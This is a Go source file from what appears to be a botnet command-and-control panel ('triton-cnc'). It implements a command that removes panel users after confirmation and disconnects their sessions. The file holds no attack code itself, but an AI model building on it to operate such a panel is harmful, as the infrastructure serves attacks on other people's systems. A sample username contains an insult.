package users_edit

import (
	"time"
	"triton-cnc/core/mysql"
	"triton-cnc/core/sessions/sessions"
	"triton-cnc/core/models/json/build"

	"golang.org/x/term"
)


func RemoveAccount(sessionss *sessions.Session_Store, cmd []string) {

	if len(cmd) <= 2 {
		sessionss.Channel.Write([]byte("\x1b[0m"+build.Config.AppConfig.AppName+" -> invaild length > users remove [users array, eg \"root kanker\"]\r\n"))
		return
	}


	sessionss.Channel.Write([]byte("are you sure you want to remove these users ?. this action can not be undone\r\n"))
	Check := term.NewTerminal(sessionss.Channel, "Y/n ?>")

	CommandOut, error := Check.ReadLine()
	if error != nil || CommandOut != "Y" {
		return
	}

	for LenCon := 2; LenCon < len(cmd); LenCon++ {
		User, boolen := database.GetUser(cmd[LenCon])
		if boolen != nil || User == nil {
			sessionss.Channel.Write([]byte("\x1b[0m"+build.Config.AppConfig.AppName+" -> Can't find user you entered at len of \""+cmd[LenCon]+"\"\r\n"))
			continue
		}

		error := database.RemoveUser(cmd[LenCon])
		if !error {
			sessionss.Channel.Write([]byte("\x1b[0m"+build.Config.AppConfig.AppName+" -> failed to update \""+cmd[LenCon]+"\" as removed\r\n"))
			continue
		} else {
			sessionss.Channel.Write([]byte("\x1b[0m\"\x1b[38;5;1m"+cmd[LenCon]+"\x1b[0m\" has been removed\r\n"))
		}


		for _, session := range sessions.SessionMap {
			if session.User.Username == cmd[LenCon] {
				session.Channel.Write([]byte("\x1b[0m\x1b7\x1b[1A\r\x1b[2K \x1b[38;5;2mYour account has been removed by "+sessionss.User.Username+"\x1b[0m\x1b[38;5;15m\x1b8"))
				delete(sessions.SessionMap, session.Int_ID)
				time.Sleep(1 * time.Second)
				session.Channel.Close()
				return
			}
		}

		continue
	}
}